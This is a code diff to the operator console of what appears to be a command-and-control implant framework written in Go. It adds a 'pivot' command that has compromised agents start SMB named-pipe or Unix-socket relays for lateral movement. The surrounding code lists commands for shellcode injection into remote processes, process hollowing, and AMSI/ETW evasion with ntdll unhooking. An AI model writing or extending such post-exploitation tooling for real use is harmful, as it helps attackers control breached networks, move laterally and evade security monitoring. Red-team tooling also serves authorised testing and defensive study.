@@ -165,6 +165,8 @@ func (sh *Shell) executeAgentCmd(cmd string, args []string) {
 		sh.cmdHollow(args)
 	case "evasion":
 		sh.cmdEvasion()
+	case "pivot":
+		sh.cmdPivot(args)
 	default:
 		// Check if it's an AD command
 		if strings.HasPrefix(cmd, "ad-") {
@@ -587,6 +589,7 @@ func (sh *Shell) cmdAgentHelp() {
 		{"inject <pid> <file>", "Inject shellcode into remote process"},
 		{"hollow <exe> <file>", "Process hollowing (spawn + inject)"},
 		{"evasion", "Re-run evasion (AMSI/ETW/unhook)"},
+		{"pivot <start|stop|list>", "SMB/Unix socket pivot relay"},
 		{"ad-*", "Active Directory commands (type 'ad-help')"},
 		{"back", "Return to main menu"},
 	}
@@ -818,6 +821,22 @@ func (sh *Shell) cmdHollow(args []string) {
 func (sh *Shell) cmdEvasion() {
 	Info("Re-running evasion techniques on agent (AMSI, ETW, ntdll unhook)...")
 	sh.queueTask(protocol.TaskEvasion, nil, nil)
+}
+
+func (sh *Shell) cmdPivot(args []string) {
+	if len(args) == 0 {
+		Error("Usage: pivot <start|stop|list> [pipe-name]")
+		Info("Starts an SMB named pipe (Windows) or Unix socket (Linux) relay")
+		Info("Internal agents connect through the relay for pivoting")
+		Info("")
+		Info("Examples:")
+		fmt.Printf("    %spivot start%s              Start relay with default pipe name\n", colorCyan, colorReset)
+		fmt.Printf("    %spivot start customname%s    Start relay with custom name\n", colorCyan, colorReset)
+		fmt.Printf("    %spivot list%s                List active pivots\n", colorCyan, colorReset)
+		fmt.Printf("    %spivot stop%s                Stop the relay\n", colorCyan, colorReset)
+		return
+	}
+	sh.queueTask(protocol.TaskPivot, args, nil)
 }
 
 func (sh *Shell) cmdAD(cmd string, args []string) {
